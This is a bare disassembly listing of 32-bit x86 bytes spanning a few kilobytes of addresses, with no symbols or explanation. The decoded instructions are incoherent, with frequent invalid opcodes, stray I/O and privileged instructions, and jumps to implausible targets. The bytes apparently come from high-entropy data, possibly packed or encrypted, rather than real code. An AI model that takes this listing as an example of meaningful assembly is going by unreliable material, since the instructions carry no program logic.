  423dac:	26 f3 9f             	es repz lahf
  423daf:	df 18                	fistps (%eax)
  423db1:	cc                   	int3
  423db2:	91                   	xchg   %eax,%ecx
  423db3:	b8 0a a5 83 91       	mov    $0x9183a50a,%eax
  423db8:	fc                   	cld
  423db9:	7d 75                	jge    0x423e30
  423dbb:	6a ee                	push   $0xffffffee
  423dbd:	56                   	push   %esi
  423dbe:	67 43                	addr16 inc %ebx
  423dc0:	e0 2f                	loopne 0x423df1
  423dc2:	59                   	pop    %ecx
  423dc3:	1c d2                	sbb    $0xd2,%al
  423dc5:	08 4b f5             	or     %cl,-0xb(%ebx)
  423dc8:	c4 e1 3d ce          	(bad)
  423dcc:	b6 ba                	mov    $0xba,%dh
  423dce:	2f                   	das
  423dcf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423dd0:	a8 93                	test   $0x93,%al
  423dd2:	21 80 9a 6c 13 59    	and    %eax,0x59136c9a(%eax)
  423dd8:	8c 45 05             	mov    %es,0x5(%ebp)
  423ddb:	32 7e 1e             	xor    0x1e(%esi),%bh
  423dde:	f7 0a 70 f7 e9 e3    	testl  $0xe3e9f770,(%edx)
  423de4:	62                   	(bad)
  423de5:	d0 db                	rcr    $1,%bl
  423de7:	bc 54 a9 cd 95       	mov    $0x95cda954,%esp
  423dec:	46                   	inc    %esi
  423ded:	82 bf 6e 38 5b b1 47 	cmpb   $0x47,-0x4ea4c792(%edi)
  423df4:	2a 34 a3             	sub    (%ebx,%eiz,4),%dh
  423df7:	20 1c 0d 95 f9 0e e6 	and    %bl,-0x19f1066b(,%ecx,1)
  423dfe:	87 d2                	xchg   %edx,%edx
  423e00:	00 bf 79 ab f2 97    	add    %bh,-0x680d5487(%edi)
  423e06:	6b 84 e4 70 5d 5d d6 	imul   $0x49,-0x29a2a290(%esp,%eiz,8),%eax
  423e0d:	49 
  423e0e:	4f                   	dec    %edi
  423e0f:	36 c8 22 41 0f       	ss enter $0x4122,$0xf
  423e14:	ba fb 33 e8 ac       	mov    $0xace833fb,%edx
  423e19:	d4 25                	aam    $0x25
  423e1b:	c1 9e ad 17 9a 90 86 	rcrl   $0x86,-0x6f65e853(%esi)
  423e22:	09 73 82             	or     %esi,-0x7e(%ebx)
  423e25:	5f                   	pop    %edi
  423e26:	fb                   	sti
  423e27:	4b                   	dec    %ebx
  423e28:	74 38                	je     0x423e62
  423e2a:	ed                   	in     (%dx),%eax
  423e2b:	24 66                	and    $0x66,%al
  423e2d:	11 df                	adc    %ebx,%edi
  423e2f:	fd                   	std
  423e30:	58                   	pop    %eax
  423e31:	ea d1 d6 4a c3 c3 af 	ljmp   $0xafc3,$0xc34ad6d1
  423e38:	3c 9c                	cmp    $0x9c,%al
  423e3a:	b5 88                	mov    $0x88,%ch
  423e3c:	2e 75 a7             	jne,pn 0x423de6
  423e3f:	61                   	popa
  423e40:	20 4e 99             	and    %cl,-0x67(%esi)
  423e43:	3a 12                	cmp    (%edx),%dl
  423e45:	27                   	daa
  423e46:	8b 13                	mov    (%ebx),%edx
  423e48:	04 00                	add    $0x0,%al
  423e4a:	7d ec                	jge    0x423e38
  423e4c:	f6 d8                	neg    %al
  423e4e:	6f                   	outsl  %ds:(%esi),(%dx)
  423e4f:	c5 e8 b1             	(bad)
  423e52:	61                   	popa
  423e53:	9e                   	sahf
  423e54:	da 8a 53 77 cc 63    	fimull 0x63cc7753(%edx)
  423e5a:	45                   	inc    %ebp
  423e5b:	50                   	push   %eax
  423e5c:	be 3c 37 29 b0       	mov    $0xb029373c,%esi
  423e61:	15 29 02 a2 ee       	adc    $0xeea20229,%eax
  423e66:	1b db                	sbb    %ebx,%ebx
  423e68:	94                   	xchg   %eax,%esp
  423e69:	c7                   	(bad)
  423e6a:	0d b4 86 a0 ff       	or     $0xffa086b4,%eax
  423e6f:	8c 78 79             	mov    %?,0x79(%eax)
  423e72:	f1                   	int1
  423e73:	65 6a 52             	gs push $0x52
  423e76:	e3 3e                	jecxz  0x423eb6
  423e78:	5c                   	pop    %esp
  423e79:	2b d5                	sub    %ebp,%edx
  423e7b:	17                   	pop    %ss
  423e7c:	4e                   	dec    %esi
  423e7d:	04 c7                	add    $0xc7,%al
  423e7f:	f0 40                	lock inc %eax
  423e81:	dd b9 c9 32 b6 ab    	fnstsw -0x5449cd37(%ecx)
  423e87:	a2 24 8f 9d 7b       	mov    %al,0x7b9d8f24
  423e8c:	16                   	push   %ss
  423e8d:	68 8f 54 08 41       	push   $0x4108548f
  423e92:	81 2d fa 19 73 06 ec 	subl   $0xdf65f2ec,0x67319fa
  423e99:	f2 65 df 
  423e9c:	de cb                	fmulp  %st,%st(3)
  423e9e:	57                   	push   %edi
  423e9f:	b8 d0 a4 49 91       	mov    $0x9149a4d0,%eax
  423ea4:	c2 7d 3b             	ret    $0x3b7d
  423ea7:	6a b4                	push   $0xffffffb4
  423ea9:	56                   	push   %esi
  423eaa:	2d 43 a6 2f 1f       	sub    $0x1f2fa643,%eax
  423eaf:	1c 98                	sbb    $0x98,%al
  423eb1:	08 11                	or     %dl,(%ecx)
  423eb3:	f5                   	cmc
  423eb4:	8a e1                	mov    %cl,%ah
  423eb6:	03 ce                	add    %esi,%ecx
  423eb8:	7c ba                	jl     0x423e74
  423eba:	f5                   	cmc
  423ebb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  423ebc:	6e                   	outsb  %ds:(%esi),(%dx)
  423ebd:	93                   	xchg   %eax,%ebx
  423ebe:	e7 7f                	out    %eax,$0x7f
  423ec0:	60                   	pusha
  423ec1:	6c                   	insb   (%dx),%es:(%edi)
  423ec2:	d9 58 52             	fstps  0x52(%eax)
  423ec5:	45                   	inc    %ebp
  423ec6:	cb                   	lret
  423ec7:	31 44 1e bd          	xor    %eax,-0x43(%esi,%ebx,1)
  423ecb:	0a 36                	or     (%esi),%dh
  423ecd:	f7 af e3 28 d0 a1    	imull  -0x5e2fd71d(%edi)
  423ed3:	bc 1a a9 93 95       	mov    $0x9593a91a,%esp
  423ed8:	0c 82                	or     $0x82,%al
  423eda:	85 6e fe             	test   %ebp,-0x2(%esi)
  423edd:	5a                   	pop    %edx
  423ede:	77 47                	ja     0x423f27
  423ee0:	f0 33 69 20          	lock xor 0x20(%ecx),%ebp
  423ee4:	e2 0c                	loop   0x423ef2
  423ee6:	5b                   	pop    %ebx
  423ee7:	f9                   	stc
  423ee8:	d4 e5                	aam    $0xe5
  423eea:	4d                   	dec    %ebp
  423eeb:	d2 c6                	rol    %cl,%dh
  423eed:	be 3f ab b8 97       	mov    $0x97b8ab3f,%esi
  423ef2:	31 84 aa 70 23 5d 9c 	xor    %eax,-0x63a2dc90(%edx,%ebp,4)
  423ef9:	49                   	dec    %ecx
  423efa:	15 36 8e 22 07       	adc    $0x7228e36,%eax
  423eff:	0f 80 fb f9 e7 72    	jo     0x732a3900
  423f05:	d4 eb                	aam    $0xeb
  423f07:	c0 64 ad dd 99       	shlb   $0x99,-0x23(%ebp,%ebp,4)
  423f0c:	56                   	push   %esi
  423f0d:	86 cf                	xchg   %cl,%bh
  423f0f:	72 48                	jb     0x423f59
  423f11:	5f                   	pop    %edi
  423f12:	c1 4b 3a 38          	rorl   $0x38,0x3a(%ebx)
  423f16:	b3 24                	mov    $0x24,%bl
  423f18:	2c 11                	sub    $0x11,%al
  423f1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  423f1b:	fd                   	std
  423f1c:	1e                   	push   %ds
  423f1d:	ea 97 d6 10 c3 89 af 	ljmp   $0xaf89,$0xc310d697
  423f24:	02 9c 7b 88 f4 74 6d 	add    0x6d74f488(%ebx,%edi,2),%bl
  423f2b:	61                   	popa
  423f2c:	e6 4d                	out    %al,$0x4d
  423f2e:	5f                   	pop    %edi
  423f2f:	3a d8                	cmp    %al,%bl
  423f31:	26 51                	es push %ecx
  423f33:	13 ca                	adc    %edx,%ecx
  423f35:	ff 43 ec             	incl   -0x14(%ebx)
  423f38:	bc d8 35 c5 ae       	mov    $0xaec535d8,%esp
  423f3d:	b1 27                	mov    $0x27,%cl
  423f3f:	9e                   	sahf
  423f40:	a0 8a 19 77 92       	mov    0x9277198a,%al
  423f45:	63 0b                	arpl   %ecx,(%ebx)
  423f47:	50                   	push   %eax
  423f48:	84 3c fd 28 76 15 ef 	test   %bh,-0x10ea89d8(,%edi,8)
  423f4f:	01 68 ee             	add    %ebp,-0x12(%eax)
  423f52:	e1 da                	loope  0x423f2e
  423f54:	5a                   	pop    %edx
  423f55:	c7                   	(bad)
  423f56:	d3 b3 4c a0 c5 8c    	shll   %cl,-0x733a5fb4(%ebx)
  423f5c:	3e 79 b7             	jns,pt 0x423f16
  423f5f:	65 30 52 a9          	xor    %dl,%gs:-0x57(%edx)
  423f63:	3e 22 2b             	and    %ds:(%ebx),%ch
  423f66:	9b                   	fwait
  423f67:	17                   	pop    %ss
  423f68:	14 04                	adc    $0x4,%al
  423f6a:	8d                   	lea    (bad),%esi
  423f6b:	f0 06                	lock push %es
  423f6d:	dd 7f c9             	fnstsw -0x37(%edi)
  423f70:	f8                   	clc
  423f71:	b5 71                	mov    $0x71,%ch
  423f73:	a2 ea 8e 63 7b       	mov    %al,0x7b638eea
  423f78:	dc 67 55             	fsubl  0x55(%edi)
  423f7b:	54                   	push   %esp
  423f7c:	ce                   	into
  423f7d:	40                   	inc    %eax
  423f7e:	47                   	inc    %edi
  423f7f:	2d c0 19 39 06       	sub    $0x63919c0,%eax
  423f84:	b2 f2                	mov    $0xf2,%dl
  423f86:	2b df                	sub    %edi,%ebx
  423f88:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  423f89:	cb                   	lret
  423f8a:	1d b8 96 a4 0f       	sbb    $0xfa496b8,%eax
  423f8f:	91                   	xchg   %eax,%ecx
  423f90:	88 7d 01             	mov    %bh,0x1(%ebp)
  423f93:	6a 7a                	push   $0x7a
  423f95:	56                   	push   %esi
  423f96:	f3 42                	repz inc %edx
  423f98:	6c                   	insb   (%dx),%es:(%edi)
  423f99:	2f                   	das
  423f9a:	e5 1b                	in     $0x1b,%eax
  423f9c:	5e                   	pop    %esi
  423f9d:	08 d7                	or     %dl,%bh
  423f9f:	f4                   	hlt
  423fa0:	50                   	push   %eax
  423fa1:	e1 c9                	loope  0x423f6c
  423fa3:	cd 42                	int    $0x42
  423fa5:	ba bb a6 34 93       	mov    $0x9334a6bb,%edx
  423faa:	ad                   	lods   %ds:(%esi),%eax
  423fab:	7f 26                	jg     0x423fd3
  423fad:	6c                   	insb   (%dx),%es:(%edi)
  423fae:	9f                   	lahf
  423faf:	58                   	pop    %eax
  423fb0:	18 45 91             	sbb    %al,-0x6f(%ebp)
  423fb3:	31 0a                	xor    %ecx,(%edx)
  423fb5:	1e                   	push   %ds
  423fb6:	83 0a fc             	orl    $0xfffffffc,(%edx)
  423fb9:	f6 75 e3             	divb   -0x1d(%ebp)
  423fbc:	ee                   	out    %al,(%dx)
  423fbd:	cf                   	iret
  423fbe:	67 bc e0 a8 59 95    	addr16 mov $0x9559a8e0,%esp
  423fc4:	d2 81 4b 6e c4 5a    	rolb   %cl,0x5ac46e4b(%ecx)
  423fca:	3d 47 b6 33 2f       	cmp    $0x2f33b647,%eax
  423fcf:	20 a8 0c 21 f9 9a    	and    %ch,-0x6506def4(%eax)
  423fd5:	e5 13                	in     $0x13,%eax
  423fd7:	d2 8c be 05 ab 7e 97 	rorb   %cl,-0x688154fb(%esi,%edi,4)
  423fde:	f7 83 70 70 e9 5c 62 	testl  $0x35db4962,0x5ce97070(%ebx)
  423fe5:	49 db 35 
  423fe8:	54                   	push   %esp
  423fe9:	22 cd                	and    %ch,%cl
  423feb:	0e                   	push   %cs
  423fec:	46                   	inc    %esi
  423fed:	fb                   	sti
  423fee:	bf e7 38 d4 b1       	mov    $0xb1d438e7,%edi
  423ff3:	c0 2a ad             	shrb   $0xad,(%edx)
  423ff6:	a3 99 1c 86 95       	mov    %eax,0x95861c99
  423ffb:	72 0e                	jb     0x42400b
  423ffd:	5f                   	pop    %edi
  423ffe:	87 4b 00             	xchg   %ecx,0x0(%ebx)
  424001:	38 79 24             	cmp    %bh,0x24(%ecx)
  424004:	f2 10 6b fd          	repnz adc %ch,-0x3(%ebx)
  424008:	e4 e9                	in     $0xe9,%al
  42400a:	5d                   	pop    %ebp
  42400b:	d6                   	salc
  42400c:	d6                   	salc
  42400d:	c2 4f af             	ret    $0xaf4f
  424010:	c8 9b 41 88          	enter  $0x419b,$0x88
  424014:	ba 74 33 61 ac       	mov    $0xac613374,%edx
  424019:	4d                   	dec    %ebp
  42401a:	25 3a 9e 26 17       	and    $0x17269e3a,%eax
  42401f:	13 90 ff 09 ec 82    	adc    -0x7d13f601(%eax),%edx
  424025:	d8 fb                	fdivr  %st(3),%st
  424027:	c4 74 b1 ed          	les    -0x13(%ecx,%esi,4),%esi
  42402b:	9d                   	popf
  42402c:	66 8a df             	data16 mov %bh,%bl
  42402f:	76 58                	jbe    0x424089
  424031:	63 d1                	arpl   %edx,%ecx
  424033:	4f                   	dec    %edi
  424034:	4a                   	dec    %edx
  424035:	3c c3                	cmp    $0xc3,%al
  424037:	28 3c 15 b5 01 2e ee 	sub    %bh,-0x11d1fe4b(,%edx,1)
  42403e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42403f:	da 20                	fisubl (%eax)
  424041:	c7                   	(bad)
  424042:	99                   	cltd
  424043:	b3 12                	mov    $0x12,%bl
  424045:	a0 8b 8c 04 79       	mov    0x79048c8b,%al
  42404a:	7d 65                	jge    0x4240b1
  42404c:	f6 51 6f             	notb   0x6f(%ecx)
  42404f:	3e e8 2a 61 17 da    	ds call 0xda59a17f
  424055:	03 53 f0             	add    -0x10(%ebx),%edx
  424058:	cc                   	int3
  424059:	dc 45 c9             	faddl  -0x37(%ebp)
  42405c:	be b5 37 a2 b0       	mov    $0xb0a237b5,%esi
  424061:	8e 29                	mov    (%ecx),%gs
  424063:	7b a2                	jnp    0x424007
  424065:	67 1b 54 94          	sbb    -0x6c(%si),%edx
  424069:	40                   	inc    %eax
  42406a:	0d 2d 86 19 ff       	or     $0xff19862d,%eax
  42406f:	05 78 f2 f1 de       	add    $0xdef1f278,%eax
  424074:	6a cb                	push   $0xffffffcb
  424076:	e3 b7                	jecxz  0x42402f
  424078:	5c                   	pop    %esp
  424079:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42407a:	d5 90                	aad    $0x90
  42407c:	4e                   	dec    %esi
  42407d:	7d c7                	jge    0x424046
  42407f:	69 40 56 b9 42 32 2f 	imul   $0x2f3242b9,0x56(%eax),%eax
  424086:	ab                   	stos   %eax,%es:(%edi)
  424087:	1b 24 08             	sbb    (%eax,%ecx,1),%esp
  42408a:	9d                   	popf
  42408b:	f4                   	hlt
  42408c:	16                   	push   %ss
  42408d:	e1 8f                	loope  0x42401e
  42408f:	cd 08                	int    $0x8
  424091:	ba 81 a6 fa 92       	mov    $0x92faa681,%edx
  424096:	73 7f                	jae    0x424117
  424098:	ec                   	in     (%dx),%al
  424099:	6b 65 58 de          	imul   $0xffffffde,0x58(%ebp),%esp
  42409d:	44                   	inc    %esp
  42409e:	57                   	push   %edi
  42409f:	31 d0                	xor    %edx,%eax
  4240a1:	1d 49 0a c2 f6       	sbb    $0xf6c20a49,%eax
  4240a6:	3b e3                	cmp    %ebx,%esp
  4240a8:	b4 cf                	mov    $0xcf,%ah
  4240aa:	2d bc a6 a8 1f       	sub    $0x1fa8a6bc,%eax
  4240af:	95                   	xchg   %eax,%ebp
  4240b0:	98                   	cwtl
  4240b1:	81 11 6e 8a 5a 03    	adcl   $0x35a8a6e,(%ecx)
  4240b7:	47                   	inc    %edi
  4240b8:	7c 33                	jl     0x4240ed
  4240ba:	f5                   	cmc
  4240bb:	1f                   	pop    %ds
  4240bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4240bd:	0c e7                	or     $0xe7,%al
  4240bf:	f8                   	clc
  4240c0:	60                   	pusha
  4240c1:	e5 d9                	in     $0xd9,%eax
  4240c3:	d1 52 be             	rcll   $1,-0x42(%edx)
  4240c6:	cb                   	lret
  4240c7:	aa                   	stos   %al,%es:(%edi)
  4240c8:	44                   	inc    %esp
  4240c9:	97                   	xchg   %eax,%edi
  4240ca:	bd 83 36 70 af       	mov    $0xaf703683,%ebp
  4240cf:	5c                   	pop    %esp
  4240d0:	28 49 a1             	sub    %cl,-0x5f(%ecx)
  4240d3:	35 1a 22 93 0e       	xor    $0xe93221a,%eax
  4240d8:	0c fb                	or     $0xfb,%al
  4240da:	85 e7                	test   %esp,%edi
  4240dc:	fe                   	(bad)
  4240dd:	d3 77 c0             	shll   %cl,-0x40(%edi)
  4240e0:	f0 ac                	lock lods %ds:(%esi),%al
  4240e2:	69 99 e2 85 5b 72 d4 	imul   $0x4b4d5ed4,0x725b85e2(%ecx),%ebx
  4240e9:	5e 4d 4b 
  4240ec:	c6                   	(bad)
  4240ed:	37                   	aaa
  4240ee:	3f                   	aas
  4240ef:	24 b8                	and    $0xb8,%al
  4240f1:	10 31                	adc    %dh,(%ecx)
  4240f3:	fd                   	std
  4240f4:	aa                   	stos   %al,%es:(%edi)
  4240f5:	e9 23 d6 9c c2       	jmp    0xc2df171d
  4240fa:	15 af 8e 9b 07       	adc    $0x79b8eaf,%eax
  4240ff:	88 80 74 f9 60 72    	mov    %al,0x7260f974(%eax)
  424105:	4d                   	dec    %ebp
  424106:	eb 39                	jmp    0x424141
  424108:	64 26 dd 12          	fs fstl %es:(%edx)
  42410c:	56                   	push   %esi
  42410d:	ff cf                	dec    %edi
  42410f:	eb 48                	jmp    0x424159
  424111:	d8 c1                	fadd   %st(1),%st
  424113:	c4 3a                	les    (%edx),%edi
  424115:	b1 b3                	mov    $0xb3,%cl
  424117:	9d                   	popf
  424118:	2c 8a                	sub    $0x8a,%al
  42411a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42411b:	76 1e                	jbe    0x42413b
  42411d:	63 97 4f 10 3c 89    	arpl   %edx,-0x76c3efb1(%edi)
  424123:	28 02                	sub    %al,(%edx)
  424125:	15 7b 01 f4 ed       	adc    $0xedf4017b,%eax
  42412a:	6d                   	insl   (%dx),%es:(%edi)
  42412b:	da e6                	(bad)
  42412d:	c6                   	(bad)
  42412e:	5f                   	pop    %edi
  42412f:	b3 d8                	mov    $0xd8,%bl
  424131:	9f                   	lahf
  424132:	51                   	push   %ecx
  424133:	8c ca                	mov    %cs,%edx
  424135:	78 43                	js     0x42417a
  424137:	65 bc 51 35 3e ae    	gs mov $0xae3e3551,%esp
  42413d:	2a 27                	sub    (%edi),%ah
  42413f:	17                   	pop    %ss
  424140:	a0 03 19 f0 92       	mov    0x92f01903,%al
  424145:	dc 0b                	fmull  (%ebx)
  424147:	c9                   	leave
  424148:	84 b5 fd a1 76 8e    	test   %dh,-0x71895e03(%ebp)
  42414e:	ef                   	out    %eax,(%dx)
  42414f:	7a 68                	jp     0x4241b9
  424151:	67 e1 53             	loopew 0x4241a7
  424154:	5a                   	pop    %edx
  424155:	40                   	inc    %eax
  424156:	d3 2c 4c             	shrl   %cl,(%esp,%ecx,2)
  424159:	19 c5                	sbb    %eax,%ebp
  42415b:	05 3e f2 b7 de       	add    $0xdeb7f23e,%eax
  424160:	30 cb                	xor    %cl,%bl
  424162:	a9 b7 22 a4 9b       	test   $0x9ba422b7,%eax
  424167:	90                   	nop
  424168:	14 7d                	adc    $0x7d,%al
  42416a:	8d 69 06             	lea    0x6(%ecx),%ebp
  42416d:	56                   	push   %esi
  42416e:	7f 42                	jg     0x4241b2
  424170:	f8                   	clc
  424171:	2e 71 1b             	jno,pn 0x42418f
  424174:	ea 07 63 f4 dc e0 55 	ljmp   $0x55e0,$0xdcf46307
  42417b:	cd ce                	int    $0xce
  42417d:	b9 47 a6 c0 92       	mov    $0x92c0a647,%ecx
  424182:	39 7f b2             	cmp    %edi,-0x4e(%edi)
  424185:	6b 2b 58             	imul   $0x58,(%ebx),%ebp
  424188:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  424189:	44                   	inc    %esp
  42418a:	1d 31 96 1d 0f       	sbb    $0xf1d9631,%eax
  42418f:	0a 88 f6 01 e3 7a    	or     0x7ae301f6(%eax),%cl
  424195:	cf                   	iret
  424196:	f3 bb 6c a8 e5 94    	repz mov $0x94e5a86c,%ebx
  42419c:	5e                   	pop    %esi
  42419d:	81 d7 6d 50 5a c9    	adc    $0xc95a506d,%edi
  4241a3:	46                   	inc    %esi
  4241a4:	42                   	inc    %edx
  4241a5:	33 bb 1f 34 0c ad    	xor    -0x52f3cbe1(%ebx),%edi
  4241ab:	f8                   	clc
  4241ac:	26 e5 9f             	es in  $0x9f,%eax
  4241af:	d1 18                	rcrl   $1,(%eax)
  4241b1:	be 91 aa 0a 97       	mov    $0x970aaa91,%esi
  4241b6:	83 83 fc 6f 75 5c ee 	addl   $0xffffffee,0x5c756ffc(%ebx)
  4241bd:	48                   	dec    %eax
  4241be:	67 35 e0 21 59 0e    	addr16 xor $0xe5921e0,%eax
  4241c4:	d2 fa                	sar    %cl,%dl
  4241c6:	4b                   	dec    %ebx
  4241c7:	e7 c4                	out    %eax,$0xc4
  4241c9:	d3 3d c0 b6 ac 2f    	sarl   %cl,0x2facb6c0
  4241cf:	99                   	cltd
  4241d0:	a8 85                	test   $0x85,%al
  4241d2:	21 72 9a             	and    %esi,-0x66(%edx)
  4241d5:	5e                   	pop    %esi
  4241d6:	13 4b 8c             	adc    -0x74(%ebx),%ecx
  4241d9:	37                   	aaa
  4241da:	05 24 7e 10 f7       	add    $0xf7107e24,%eax
  4241df:	fc                   	cld
  4241e0:	70 e9                	jo     0x4241cb
  4241e2:	e9 d5 62 c2 db       	jmp    0xdc04a4bc
  4241e7:	ae                   	scas   %es:(%edi),%al
  4241e8:	54                   	push   %esp
  4241e9:	9b                   	fwait
  4241ea:	cd 87                	int    $0x87
  4241ec:	46                   	inc    %esi
  4241ed:	74 bf                	je     0x4241ae
  4241ef:	60                   	pusha
  4241f0:	38 4d b1             	cmp    %cl,-0x4f(%ebp)
  4241f3:	39 2a                	cmp    %ebp,(%edx)
  4241f5:	26 a3 12 1c ff 95    	mov    %eax,%es:0x95ff1c12
  4241fb:	eb 0e                	jmp    0x42420b
  4241fd:	d8 87 c4 00 b1 79    	fadds  0x79b100c4(%edi)
  424203:	9d                   	popf
  424204:	f2 89 6b 76          	repnz mov %ebp,0x76(%ebx)
  424208:	e4 62                	in     $0x62,%al
  42420a:	5d                   	pop    %ebp
  42420b:	4f                   	dec    %edi
  42420c:	d6                   	salc
  42420d:	3b 4f 28             	cmp    0x28(%edi),%ecx
  424210:	c8 14 41 01          	enter  $0x4114,$0x1
  424214:	ba ed 33 da ac       	mov    $0xacda33ed,%edx
  424219:	c6                   	(bad)
  42421a:	25 b3 9e 9f 17       	and    $0x179f9eb3,%eax
  42421f:	8c 90 78 09 65 82    	mov    %ss,-0x7d9af688(%eax)
  424225:	51                   	push   %ecx
  424226:	fb                   	sti
  424227:	3d 74 2a ed 16       	cmp    $0x16ed2a74,%eax
  42422c:	66 03 df             	add    %di,%bx
  42422f:	ef                   	out    %eax,(%dx)
  424230:	58                   	pop    %eax
  424231:	dc d1                	(bad)
  424233:	c8 4a b5 c3          	enter  $0xb54a,$0xc3
  424237:	a1 3c 8e b5 7a       	mov    0x7ab58e3c,%eax
  42423c:	2e 67 a7             	cmpsl  %es:(%di),%cs:(%si)
  42423f:	53                   	push   %ebx
  424240:	20 40 99             	and    %al,-0x67(%eax)
  424243:	2c 12                	sub    $0x12,%al
  424245:	19 8b 05 04 f2 7d    	sbb    %ecx,0x7df20405(%ebx)
  42424b:	de f6                	fdivp  %st,%st(6)
  42424d:	ca 6f b7             	lret   $0xb76f
  424250:	e8 a3 61 90 da       	call   0xdad2a3f8
  424255:	7c 53                	jl     0x4242aa
  424257:	69 cc 55 45 42 be    	imul   $0xbe424555,%esp,%ecx
  42425d:	2e 37                	cs aaa
  42425f:	1b b0 07 29 f4 a2    	sbb    -0x5d0bd6f9(%eax),%esi
  424265:	e0 1b                	loopne 0x424282
  424267:	cd 94                	int    $0x94
  424269:	b9 0d a6 86 92       	mov    $0x9286a60d,%ecx
  42426e:	ff                   	(bad)
  42426f:	7e 78                	jle    0x4242e9
  424271:	6b f1 57             	imul   $0x57,%ecx,%esi
  424274:	6a 44                	push   $0x44
  424276:	e3 30                	jecxz  0x4242a8
  424278:	5c                   	pop    %esp
  424279:	1d d5 09 4e f6       	sbb    $0xf64e09d5,%eax
  42427e:	c7                   	(bad)
  42427f:	e2 40                	loop   0x4242c1
  424281:	cf                   	iret
  424282:	b9 bb 32 a8 ab       	mov    $0xaba832bb,%ecx
  424287:	94                   	xchg   %eax,%esp
  424288:	24 81                	and    $0x81,%al
  42428a:	9d                   	popf
  42428b:	6d                   	insl   (%dx),%es:(%edi)
  42428c:	16                   	push   %ss
  42428d:	5a                   	pop    %edx
  42428e:	8f 46 08             	pop    0x8(%esi)
  424291:	33 81 1f fa 0b 73    	xor    0x730bfa1f(%ecx),%eax
  424297:	f8                   	clc
  424298:	ec                   	in     (%dx),%al
  424299:	e4 65                	in     $0x65,%al
  42429b:	d1 de                	rcr    $1,%esi
  42429d:	bd 57 aa d0 96       	mov    $0x96d0aa57,%ebp
  4242a2:	49                   	dec    %ecx
  4242a3:	83 c2 6f             	add    $0x6f,%edx
  4242a6:	3b 5c b4 48          	cmp    0x48(%esp,%esi,4),%ebx
  4242aa:	2d 35 a6 21 1f       	sub    $0x1f21a635,%eax
  4242af:	0e                   	push   %cs
  4242b0:	98                   	cwtl
  4242b1:	fa                   	cli
  4242b2:	11 e7                	adc    %esp,%edi
  4242b4:	8a d3                	mov    %bl,%dl
  4242b6:	03 c0                	add    %eax,%eax
  4242b8:	7c ac                	jl     0x424266
  4242ba:	f5                   	cmc
  4242bb:	98                   	cwtl
  4242bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4242bd:	85 e7                	test   %esp,%edi
  4242bf:	71 60                	jno    0x424321
  4242c1:	5e                   	pop    %esi
  4242c2:	d9 4a 52             	(bad) 0x52(%edx)
  4242c5:	37                   	aaa
  4242c6:	cb                   	lret
  4242c7:	23 44 10 bd          	and    -0x43(%eax,%edx,1),%eax
  4242cb:	fc                   	cld
  4242cc:	36 e9 af d5 28 c2    	ss jmp 0xc26b1881
  4242d2:	a1 ae 1a 9b 93       	mov    0x939b1aae,%eax
  4242d7:	87 0c 74             	xchg   %ecx,(%esp,%esi,2)
  4242da:	85 60 fe             	test   %esp,-0x2(%eax)
  4242dd:	4c                   	dec    %esp
  4242de:	77 39                	ja     0x424319
  4242e0:	f0 25 69 12 e2 fe    	lock and $0xfee21269,%eax
  4242e6:	5b                   	pop    %ebx
  4242e7:	eb d4                	jmp    0x4242bd
  4242e9:	d7                   	xlat   %ds:(%ebx)
  4242ea:	4d                   	dec    %ebp
  4242eb:	c4                   	(bad)
  4242ec:	c6                   	(bad)
  4242ed:	b0 3f                	mov    $0x3f,%al
  4242ef:	9d                   	popf
  4242f0:	b8 89 31 76 aa       	mov    $0xaa763189,%eax
  4242f5:	62 23                	bound  %esp,(%ebx)
  4242f7:	4f                   	dec    %edi
  4242f8:	9c                   	pushf
  4242f9:	3b 15 28 8e 14 07    	cmp    0x7148e28,%edx
  4242ff:	01 80 ed f9 d9 72    	add    %eax,0x72d9f9ed(%eax)
  424305:	c6                   	(bad)
  424306:	eb b2                	jmp    0x4242ba
  424308:	64 9f                	fs lahf
  42430a:	dd 8b 56 78 cf 64    	fisttpll 0x64cf7856(%ebx)
  424310:	48                   	dec    %eax
  424311:	51                   	push   %ecx
  424312:	c1 3d 3a 2a b3 16 2c 	sarl   $0x2c,0x16b32a3a
  424319:	03 a5 ef 1e dc 97    	add    -0x6823e111(%ebp),%esp
  42431f:	c8 10 b5 89          	enter  $0xb510,$0x89
  424323:	a1 02 8e 7b 7a       	mov    0x7a7b8e02,%eax
  424328:	f4                   	hlt
  424329:	66 6d                	insw   (%dx),%es:(%edi)
  42432b:	53                   	push   %ebx
  42432c:	e6 3f                	out    %al,$0x3f
  42432e:	5f                   	pop    %edi
  42432f:	2c d8                	sub    $0xd8,%al
  424331:	18 51 05             	sbb    %dl,0x5(%ecx)
  424334:	ca f1 43             	lret   $0x43f1
  424337:	de bc ca 35 b7 ae a3 	fidivrs -0x5c5148cb(%edx,%ecx,8)
  42433e:	27                   	daa
  42433f:	90                   	nop
  424340:	a0 7c 19 69 92       	mov    0x9269197c,%al
  424345:	55                   	push   %ebp
  424346:	0b 42 84             	or     -0x7c(%edx),%eax
  424349:	2e fd                	cs std
  42434b:	1a 76 07             	sbb    0x7(%esi),%dh
  42434e:	ef                   	out    %eax,(%dx)
  42434f:	f3 68 e0 e1 cc 5a    	repz push $0x5acce1e0
  424355:	b9 d3 a5 4c 92       	mov    $0x924ca5d3,%ecx
  42435a:	c5 7e 3e             	lds    0x3e(%esi),%edi
  42435d:	6b b7 57 30 44 a9 30 	imul   $0x30,-0x56bbcfa9(%edi),%esi
  424364:	22 1d 9b 09 14 f6    	and    0xf614099b,%bl
  42436a:	8d                   	lea    (bad),%esp
  42436b:	e2 06                	loop   0x424373
  42436d:	cf                   	iret
  42436e:	7f bb                	jg     0x42432b
  424370:	f8                   	clc
  424371:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  424372:	71 94                	jno    0x424308
  424374:	ea 80 63 6d dc 59 55 	ljmp   $0x5559,$0xdc6d6380
  42437b:	46                   	inc    %esi
  42437c:	ce                   	into
  42437d:	32 47 1f             	xor    0x1f(%edi),%al
  424380:	c0 0b 39             	rorb   $0x39,(%ebx)
  424383:	f8                   	clc
  424384:	b2 e4                	mov    $0xe4,%dl
